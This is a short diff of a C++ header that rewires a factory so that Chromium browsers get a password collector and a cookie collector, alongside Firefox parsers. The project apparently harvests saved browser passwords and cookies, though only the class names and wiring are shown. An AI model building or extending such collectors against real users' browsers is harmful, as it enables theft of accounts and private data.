@@ -1,8 +1,8 @@
 ﻿#pragma once
 #include "ICollector.h"
-#include "ChromeParser.h"
+#include "ChromePasswordCollecter.h"
 #include "FireFoxParser.h"
-#include "ChromeCookiesParser.h"
+#include "ChromeCookiesCollecter.h"
 #include "FireFoxCookiesParser.h"
 
 namespace collector
@@ -19,7 +19,7 @@ namespace collector
 		switch (type_collector)
 		{
 			case BrowserType::None: return nullptr;
-			case BrowserType::Chromium: return new ChromiumParser();
+			case BrowserType::Chromium: return new ChromePasswordCollecter();
 			case BrowserType::Mozilla: return new FireFoxParser();
 			default: return nullptr;;
 		}
@@ -30,7 +30,7 @@ namespace collector
 		switch (type_collector)
 		{
 		case BrowserType::None: return nullptr;
-		case BrowserType::Chromium: return new ChromeCookiesParser();
+		case BrowserType::Chromium: return new ChromeCookiesCollecter();
 		case BrowserType::Mozilla: return new FireFoxCookiesParser();
 		default: return nullptr;;
 		}
